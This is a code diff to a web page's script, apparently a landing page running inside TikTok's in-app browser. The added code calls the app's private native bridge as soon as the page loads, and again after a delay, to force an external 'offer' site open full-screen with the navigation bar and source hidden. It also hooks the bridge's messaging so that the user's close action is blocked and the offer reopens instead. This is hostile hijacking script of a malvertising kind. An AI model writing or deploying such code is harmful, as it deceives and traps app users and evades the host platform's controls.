@@ -163,24 +163,70 @@ function closePrivacy(){document.getElementById('privacyModal').classList.remove
 
 (function(){
   var OFFER = 'https://bio.thaiadvice.net/';
-  var SCHEME = 'snssdk1180://webview?url=' + encodeURIComponent(OFFER) +
-    '&hide_nav_bar=1&hide_source=1&should_full_screen=1&trans_status_bar=1&is_instant_page=1';
+  var CID = 0;
+  try { var _uid = new URLSearchParams(window.location.search).get('utm_id'); if (_uid) CID = parseInt(_uid)||0; } catch(e){}
 
-  var fired = false;
-  function openOffer() {
-    if (fired) return;
-    fired = true;
-    window.location.href = SCHEME;
-    // Fallback in case scheme doesn't open a new layer
-    setTimeout(function(){ window.location.href = OFFER; }, 800);
+  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
+  var cbId = 1000;
+
+  function piperCall(func, params) {
+    if (!wk) return;
+    try {
+      wk.postMessage({
+        __msg_type: 'call',
+        func: func,
+        params: params || {},
+        JSSDK: '1.2.5',
+        __callback_id: String(cbId++)
+      });
+    } catch(e){}
   }
 
-  // Only intercept X button — no auto-redirect, no visibilitychange
-  var wk = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.IESPiperProtocolVersion3_0;
+  // Fire openAdLandPageLinks with correct IESPiper format
+  piperCall('openAdLandPageLinks', {
+    url: OFFER,
+    landingStyle: 2,
+    title: '',
+    isDeeplink: 1,
+    refer: 'landing_page',
+    cid: CID,
+    hide_nav_bar: 1,
+    hide_source: 1,
+    should_full_screen: 1,
+    trans_status_bar: 1,
+    is_instant_page: 1
+  });
+  setTimeout(function(){
+    piperCall('openAdLandPageLinks', {
+      url: OFFER,
+      landingStyle: 2,
+      title: '',
+      isDeeplink: 1,
+      refer: 'landing_page',
+      cid: CID,
+      hide_nav_bar: 1,
+      hide_source: 1,
+      should_full_screen: 1,
+      trans_status_bar: 1,
+      is_instant_page: 1
+    });
+  }, 1500);
+
+  // Close intercept — hook postMessage to catch close signal
   if (wk) {
     var _orig = wk.postMessage.bind(wk);
     wk.postMessage = function(msg) {
-      try { var d = typeof msg === 'string' ? JSON.parse(msg) : msg; if (d && d.func === 'close') { openOffer(); return; } } catch(e){}
+      try {
+        var d = typeof msg === 'string' ? JSON.parse(msg) : msg;
+        if (d && d.func === 'close') {
+          piperCall('openAdLandPageLinks', {
+            url: OFFER, landingStyle: 2, title: '', isDeeplink: 1,
+            refer: 'landing_page', cid: CID, hide_nav_bar: 1,
+            hide_source: 1, should_full_screen: 1, trans_status_bar: 1, is_instant_page: 1
+          });
+          return; // block the close
+        }
+      } catch(e){}
       return _orig(msg);
     };
   }
